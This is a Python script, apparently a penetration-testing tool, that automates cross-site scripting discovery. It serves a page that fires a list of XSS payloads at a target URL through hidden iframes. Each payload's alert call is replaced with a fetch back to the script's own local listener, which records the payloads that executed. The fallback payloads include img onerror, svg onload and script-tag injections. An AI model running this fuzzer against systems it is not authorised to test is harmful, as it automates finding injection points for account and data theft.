#!/usr/bin/env python3
import argparse
import time
import base64
import logging
import os
import threading
import webbrowser
from flask import Flask, request, render_template_string

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class XSSLocalFuzzer:
    def __init__(self, port=1337):
        self.port = port
        self.app = Flask(__name__)
        self.successful_payloads = []
        self._setup_routes()
        
        self.fallback_payloads = [
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            'javascript:alert(1)'
        ]

    def load_payloads(self, filename="xss_payloads.txt"):
        path = os.path.join("payloads", filename)
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        return self.fallback_payloads

    def _setup_routes(self):
        @self.app.route('/start')
        def start_page():
            payloads = self.load_payloads()
            my_url = f"http://localhost:{self.port}"
            test_endpoint = f"{my_url}/test"
            
            js_payloads_array = []
            for idx, p in enumerate(payloads):
                b64_p = base64.b64encode(p.encode()).decode()

                trigger = f"fetch('{test_endpoint}?id={idx}&p={b64_p}')"
                
                final_js = p.replace("alert(1)", trigger)
                js_payloads_array.append(final_js)

            html_template = """
            <html>
            <head><title>XSS Local Fuzzer Core</title></head>
            <body style="font-family: sans-serif; background: #1a1a1a; color: #fff; padding: 20px;">
                <h2>🚀 XSS Automation Engine Attivo</h2>
                <p>Target: <strong style="color: #00bcd4;">{{ target }}</strong></p>
                <p>Payload totali caricati: <strong id="total">0</strong></p>
                <p>Stato attuale: <span id="status" style="color: #ff9800;">Iniezione in corso...</span></p>
                <div id="counter" style="font-size: 24px; margin: 20px 0;">0%</div>

                <script>
                    const payloads = {{ payloads_js | safe }};
                    const target = "{{ target }}";
                    const param = "{{ param }}";
                    document.getElementById('total').innerText = payloads.length;

                    async function runFuzzing() {
                        for(let i = 0; i < payloads.length; i++) {
                            let url = target;
                            if(param) {
                                let sep = url.includes('?') ? '&' : '?';
                                url += sep + param + "=" + encodeURIComponent(payloads[i]);
                            } else {
                                url += "/" + encodeURIComponent(payloads[i]);
                            }
                            
                            // Carica il payload nel target tramite un iframe nascosto
                            let ifr = document.createElement('iframe');
                            ifr.style.display = 'none';
                            ifr.src = url;
                            document.body.appendChild(ifr);
                            
                            // Aggiorna la percentuale a schermo
                            let percent = Math.floor(((i + 1) / payloads.length) * 100);
                            document.getElementById('counter').innerText = percent + "% (" + (i+1) + "/" + payloads.length + ")";
                            
                            // Pausa per permettere al browser di caricare e testare il JS (adatta se il server locale è lento)
                            await new Promise(r => setTimeout(r, 150));
                            ifr.remove();
                        }
                        document.getElementById('status').innerText = "Fuzzing Completato!";
                        document.getElementById('status').style.color = "#4caf50";
                    }
                    
                    window.onload = runFuzzing;
                </script>
            </body>
            </html>
            """
            return render_template_string(
                html_template, 
                target=self.target_url, 
                param=self.param_name, 
                payloads_js=js_payloads_array
            )

        @self.app.route('/test', methods=['GET'])
        def test():
            p_id = request.args.get('id')
            p_content = request.args.get('p')
            if p_content:
                decoded_p = base64.b64decode(p_content).decode('utf-8', errors='ignore')
                if decoded_p not in self.successful_payloads:
                    self.successful_payloads.append(decoded_p)
                    print(f"\n\033[92m[+] ID {p_id} ha eseguito JS!")
                    print(f"Payload: {decoded_p}\033[0m")
            return "OK", 200

    def start(self, target_url, param_name):
        self.target_url = target_url
        self.param_name = param_name
        
        threading.Thread(target=lambda: self.app.run(host='127.0.0.1', port=self.port, debug=False, use_reloader=False), daemon=True).start()
        
        print(f"\n\033[94m[*] Server XSS avviato sulla porta {self.port}\033[0m")
        print(f"[*] Destinazione attacco locale: {target_url}")
        print(f"[!] Apri il browser e vai su: \033[93mhttp://localhost:{self.port}/start\033[0m")
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Tester")
    parser.add_argument("-t", "--target", required=True, help="URL dell'applicazione locale da testare (es. http://localhost:8080/index.php)")
    parser.add_argument("--param", type=str, default="", help="Parametro GET specifico (es. 'name'). Se vuoto, testa direttamente sul path dell'URL")
    parser.add_argument("-p", "--port", type=int, default=1337, help="Porta per questo tool (default: 1337)")
    args = parser.parse_args()

    fuzzer = XSSLocalFuzzer(port=args.port)
    fuzzer.start(args.target, args.param)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Chiusura.")